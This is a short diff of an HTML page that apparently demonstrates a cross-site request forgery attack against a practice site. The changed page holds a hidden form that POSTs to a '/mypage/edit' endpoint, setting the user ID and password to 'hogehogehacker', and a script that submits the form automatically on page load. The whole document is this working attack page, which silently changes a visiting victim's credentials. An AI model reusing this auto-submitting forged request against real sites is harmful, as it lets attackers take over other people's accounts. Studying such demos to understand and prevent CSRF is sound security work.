@@ -3,15 +3,11 @@
 	<meta charset="utf-8">
 </head>
 <body>
-	<div id="container"></div>
+	<form action="https://hack-csrf-sample.herokuapp.com/mypage/edit" method="POST">
+		<input type="hidden" name="userId" value="hogehogehacker" />
+		<input type="hidden" name="password" value="hogehogehacker" />
+	</form>
 	<script>
-		var container = document.querySelector("#container");
-		container.innerHTML = '' +
-		'<form action="https://hack-csrf-sample.herokuapp.com/mypage/edit" method="POST">' +
-			'<input type="hidden" name="userId" value="hogehogehacker" />' +
-			'<input type="hidden" name="password" value="hogehogehacker" />' +
-		'</form>';
-
 		var form = document.querySelector("form");
 		form.submit()
 	</script>
